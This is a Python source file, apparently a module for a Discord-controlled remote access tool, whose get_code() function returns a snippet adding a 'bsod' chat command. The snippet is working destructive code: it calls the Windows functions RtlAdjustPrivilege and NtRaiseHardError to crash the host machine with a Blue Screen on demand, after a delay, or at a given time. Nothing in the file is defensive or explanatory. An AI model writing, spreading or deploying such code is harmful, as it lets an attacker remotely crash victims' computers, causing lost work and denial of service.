
# THIS COMPONENT WILL:
# contain the command to instantly send a BSOD, send one at a specific time and also one with a timer in seconds
# ----------------------
# TODO:
# -BSOD
# -BSOD -t <12:34> | do it now if its the time, if not make a countdown to that time.
# -BSOD -s <int> | send a BSOD in <int> seconds
def get_code():
    return """

    # ADDED BSOD MODULE
    elif message.content.lower().startswith("bsod"):
    
        import asyncio
        import ctypes
        import datetime
        # Split the command into parts: .bsod [option] [value]
        parts = message.content.split()
        
        # Determine the BSOD option if provided
        option = parts[1] if len(parts) > 1 else None
        
        # Function to trigger the BSOD
        def trigger_bsod():
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        
        if option == "-t":
            # BSOD at a specific time (HH:MM)
            if len(parts) > 2:
                scheduled_time = parts[2]
                current_time = datetime.datetime.now().strftime("%H:%M")
                if scheduled_time == current_time:
                    await message.channel.send("Executing BSOD as scheduled...")
                    trigger_bsod()
                else:
                    await message.channel.send("The provided time does not match the current system time. Please use the HH:MM format and try again.")
            else:
                await message.channel.send("Please provide a time in HH:MM format after the '-t' option.")
        elif option == "-s":
            # BSOD after a delay (in seconds)
            if len(parts) > 2:
                try:
                    delay = int(parts[2])
                    await message.channel.send(f"BSOD will be executed in {delay} seconds...")
                    await asyncio.sleep(delay)
                    trigger_bsod()
                except ValueError:
                    await message.channel.send("Invalid delay. Please provide the delay in seconds as an integer.")
            else:
                await message.channel.send("Please provide a delay in seconds after the '-s' option.")
        else:
            # No option provided: execute BSOD immediately
            await message.channel.send("Executing immediate BSOD...")
            trigger_bsod()
            
"""
